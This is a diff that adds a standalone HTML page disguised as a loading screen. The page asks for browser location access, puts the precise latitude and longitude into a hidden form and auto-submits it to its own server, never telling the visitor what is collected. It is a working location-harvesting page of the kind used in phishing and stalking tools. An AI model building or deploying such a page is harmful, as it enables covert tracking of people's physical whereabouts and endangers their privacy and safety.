@@ -1,0 +1,88 @@
+<html>
+ 	<head>
+  <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0">
+  <style>
+  	  html {
+  	  background-color:white;
+  	  font-family:arial;
+  	  }
+  	  div.load {
+  	  width:100%;
+  	  height:100%;
+  	  display:block;
+  	  }
+     .loader {
+     display:inherit;
+     position:absolute;
+     top:40%;
+     right:40%;
+     width:1.5cm;
+     height:1.5cm;
+     border-radius:50%;
+     border:7px solid #eaeaff;
+     border-top:7px solid #aadfff;
+     -webkit-animation:spin 2s linear -1s infinite;
+     }
+     @-webkit-keyframes spin {
+     0% {-webkit-transform:rotate(0deg);}
+     100% {-webkit-transform:rotate(360deg);}
+     }
+     .load p {
+     opacity:0.5;
+     color:#8a9fa6;
+     font-size:17px;
+     text-align:center;
+     position:relative;
+     top:200px;
+     }     
+     .fom {
+     display:none;
+     }
+  </style>
+ </head>
+ <body>
+ 	<div class="load" id="loader">
+ 				<p>	allow location access or try refreshing page</p>
+  			<div class="loader"></div>
+  </div>  
+  <div class="fom">
+  				<form method="get" action="#">
+  					 <input id="lat" type="text" name="latitude">
+  					 <input id="lon" type="text" name="longitude">
+  					 <input id="butt" type="submit">
+  				</form>
+  </div>
+  	
+  <script>
+       var opt = { enableHighAccuracy : true };
+  		if (navigator.geolocation) {
+  		  navigator.geolocation.getCurrentPosition(datas,erro,opt) ;
+  		  } else {
+  		    alert("browser does not support geolocation");
+  		    }
+  		 function datas(position) {
+         if (position.coords) {
+  		    document.getElementById("lat").value = position.coords.latitude ;
+  		    document.getElementById("lon").value = position.coords.longitude ;
+  		    document.getElementById("butt").click() ;
+          }
+  	 	  }
+  	 	  function erro(error) {
+  	 	    switch(error.code) { 
+  	 	     case error.PERMISSION_DENIED: 
+  	 	      alert("err");
+  	 	      break; 
+  	 	     case error.POSITION_UNAVAILABLE: 
+  	 	      alert("error");
+  	 	      break;
+  	 	     case error.TIMEOUT:
+  	 	      alert("err");
+  	 	      break;
+  	 	     case error.UNKNOWN_ERROR:
+  	 	      alert("err");
+  	 	      break;
+  	 	     }
+  	 	   }
+  </script>
+ </body>
+</html>
